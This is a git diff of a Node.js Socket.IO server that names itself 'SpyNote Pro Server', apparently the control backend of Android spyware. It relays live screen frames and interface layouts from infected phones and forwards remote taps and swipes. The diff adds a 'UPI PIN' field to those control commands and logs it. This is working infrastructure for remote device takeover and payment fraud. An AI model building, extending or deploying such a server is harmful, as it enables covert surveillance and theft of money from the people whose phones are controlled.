@@ -10,13 +10,13 @@ const io = socketIo(server, {
     cors: { origin: "*", methods: ["GET", "POST"] },
     pingTimeout: 60000,
     pingInterval: 25000,
-    maxHttpBufferSize: 300 * 1024 * 1024
+    maxHttpBufferSize: 500 * 1024 * 1024 // 🔥 Ultra large for HD screens
 });
 
 app.use(compression());
 app.use(express.static('public'));
-app.use(express.json({ limit: '300mb' }));
-app.use(express.urlencoded({ limit: '300mb', extended: true }));
+app.use(express.json({ limit: '500mb' }));
+app.use(express.urlencoded({ limit: '500mb', extended: true }));
 
 const devices = new Map();
 
@@ -46,11 +46,11 @@ io.on('connection', (socket) => {
             });
             socket.join(deviceId);
             io.emit('devices-update', Array.from(devices.entries()));
-            console.log(`📱 Device registered: ${deviceId}`);
+            console.log(`📱 Device LIVE: ${deviceId} (${deviceInfo.model})`);
         }
     });
 
-    // 🔥 FIXED: Perfect screen + layout forwarding
+    // 🔥 ULTRA SMOOTH SCREEN + LAYOUT FORWARDING
     socket.on('screen-frame', (data) => {
         const deviceId = data.deviceId;
         if (devices.has(deviceId)) {
@@ -60,15 +60,16 @@ io.on('connection', (socket) => {
                 width: data.width,
                 height: data.height,
                 timestamp: data.timestamp,
-                layout: data.layout,  // 🔥 Always forward layout
+                layout: data.layout, // 🔥 LIVE LAYOUT
+                elementsCount: data.layout ? data.layout.length : 0,
                 fps: data.fps
             });
-            console.log(`📺 Frame ${deviceId}: ${data.layout?.length || 0} elements`);
         }
     });
 
+    // 🔥 CONTROL COMMANDS WITH UPI PIN SUPPORT
     socket.on('control', (data) => {
-        const { deviceId, action, x, y, startX, startY, endX, endY, duration } = data;
+        const { deviceId, action, x, y, startX, startY, endX, endY, duration, pin } = data;
         if (devices.has(deviceId)) {
             socket.to(deviceId).emit('control', {
                 action,
@@ -78,8 +79,10 @@ io.on('connection', (socket) => {
                 startY: parseFloat(startY),
                 endX: parseFloat(endX),
                 endY: parseFloat(endY),
-                duration: parseInt(duration) || 300
+                duration: parseInt(duration) || 300,
+                pin: pin // 🔥 UPI PIN SUPPORT
             });
+            console.log(`🎮 ${deviceId}: ${action}`, { x, y, pin });
         }
     });
 
@@ -88,7 +91,7 @@ io.on('connection', (socket) => {
             if (info.socketId === socket.id) {
                 devices.set(deviceId, { ...info, connected: false });
                 io.emit('devices-update', Array.from(devices.entries()));
-                console.log(`🔌 Device disconnected: ${deviceId}`);
+                console.log(`🔴 Device OFF: ${deviceId}`);
                 break;
             }
         }
@@ -97,5 +100,6 @@ io.on('connection', (socket) => {
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
-    console.log(`🚀 SpyNote Server LIVE on port ${PORT}`);
+    console.log(`🚀 SpyNote Pro Server LIVE on port ${PORT}`);
+    console.log(`📱 Web: http://localhost:${PORT}`);
 });
